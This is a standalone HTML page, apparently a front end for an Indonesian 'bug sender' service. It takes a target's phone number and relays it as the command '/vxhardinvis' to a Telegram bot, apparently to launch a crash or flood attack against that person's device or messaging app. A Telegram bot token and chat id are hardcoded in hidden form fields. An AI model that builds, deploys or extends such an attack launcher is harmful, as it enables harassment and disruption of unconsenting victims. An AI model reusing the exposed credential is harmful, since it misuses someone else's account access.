<!DOCTYPE html><html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bug Mr anon</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #0a0a0a;
            background-image: radial-gradient(circle, rgba(10,180,10,0.2) 1px, transparent 1px);
            background-size: 20px 20px;
        }
        .telegram-button {
            background-color: #00aa00;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }
        .telegram-button:hover {
            background-color: #007700;
            box-shadow: 0 0 10px #00ff00;
        }
        .message-box {
            min-height: 150px;
            max-height: 300px;
            resize: vertical;
            background-color: #111;
            color: #00ff00;
            border: 1px solid #00aa00;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="bg-black border-2 border-green-500 rounded-lg shadow-lg shadow-green-500/30 p-6 w-full max-w-md">
        <div class="flex items-center mb-6">
            <img src="https://files.catbox.moe/r55s3y.png" alt="FUCK YOU SYSTEM" class="mr-3">
        </div><form id="telegramForm" class="space-y-4">
        <div>
            <label for="name" class="block text-sm font-medium text-green-400 mb-1 font-mono">[No]:</label>
            <input type="text" id="name" class="w-full px-4 py-2 bg-black text-green-400 border border-green-500 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 font-mono" placeholder="Masukkan Nomer Target Anda...... " required>
        </div>
 
        <input type="hidden" id="token" value="7686037151:AAHOZK7nIVsWFpC7uvvZWyzX5ZiVm0WBuos">
        
        <input type="hidden" id="chatId" value="7242834240">
        
        <button type="submit" class="w-full py-2 px-4 text-white font-medium rounded-md telegram-button flex items-center justify-center">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 mr-2">
                <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10zm-3.11-8.39l6.7-5.897a.968.968 0 011.396 1.344l-8 7a.967.967 0 01-1.357-.016l-3-3a1 1 0 011.414-1.414l2.323 2.323.08.071.092-.08z"/>
            </svg>
            Kirim Bug
        </button>
    </form>
    
    <div id="statusMessage" class="mt-4 hidden p-3 rounded-md font-mono text-sm"></div>
</div>

<script>
    document.getElementById('telegramForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const name = document.getElementById('name').value;
        const token = document.getElementById('token').value;
        const chatId = document.getElementById('chatId').value;
        
        const fullMessage = `/vxhardinvis ${name}\n\n`;
        
        const statusElement = document.getElementById('statusMessage');
        statusElement.textContent = 'Mengirim BugðŸ”¥...';
        statusElement.className = 'mt-4 p-3 rounded-md bg-black text-green-400 border border-green-500';
        statusElement.classList.remove('hidden');
        
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: fullMessage,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                statusElement.textContent = 'Bug berhasil dikirim! âœ…';
                statusElement.className = 'mt-4 p-3 rounded-md bg-black text-green-400 border border-green-500';
                document.getElementById('telegramForm').reset();
            } else {
                throw new Error(data.description || 'Gagal mengirim pesan');
            }
        })
        .catch(error => {
            statusElement.textContent = `Error: ${error.message}`;
            statusElement.className = 'mt-4 p-3 rounded-md bg-black text-red-400 border border-red-500';
            console.error('Error:', error);
        });
    });

</script>

</body>
</html>
